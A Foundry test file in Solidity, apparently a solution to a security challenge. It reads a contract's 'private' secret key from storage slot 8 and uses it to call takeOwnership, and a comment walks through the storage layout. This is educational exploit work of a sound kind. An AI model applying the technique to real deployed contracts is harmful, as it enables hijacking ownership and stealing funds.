// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/PrivateData.sol";

/**
 * Hacking this contract is relatively simple, the secret key is "hidden"
 * in a private variable, but all data on a blockchain can be read, private or not.
 *
 * To hack the contract, one simply has to understand the layout of state variables in storage,
 * see https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html
 *
 * The storage layout of PrivateData.sol is as follows:
 *
 * uint256 public constant NUM = 1337;                  constant => no storage slot used
 * address public owner;                                SLOT 0
 * bytes32[5] private randomData;                       SLOT 1 - 5
 * mapping(address => uint256) public addressToKeys;    SLOT 6
 * uint128 a;                                           SLOT 7
 * uint128 b;                                           SLOT 7
 * uint256 private secretKey;                           SLOT 8
 *
 * As we can see, our secretKey is stored in slot 8. All we have to do is
 * read the storage in slot 8 and call takeOwnership(secretKey) with the result
 *
 * You can check the storage layout yourself with 
 * forge inspect PrivateData storage --pretty
 */
contract PrivateDataTest is Test {
    PrivateData internal privatedata;

    function setUp() public {
        privatedata = new PrivateData("test");
    }

    event OwnershipTaken(address indexed previousOwner, address indexed newOwner);

    function testAttack() public {
        // the secret key is stored in slot 8, vm.load returns bytes32 so have to cast it to uint
        uint256 secret = uint256(vm.load(address(privatedata), bytes32(uint256(8))));
        emit log_uint(secret);

        // reverts when wrong key
        vm.expectRevert(bytes("Not allowed!"));
        privatedata.takeOwnership(1337);

        // check for event
        vm.expectEmit(true, true, false, false);
        emit OwnershipTaken(address(this), address(this));
        privatedata.takeOwnership(secret);
    }
}
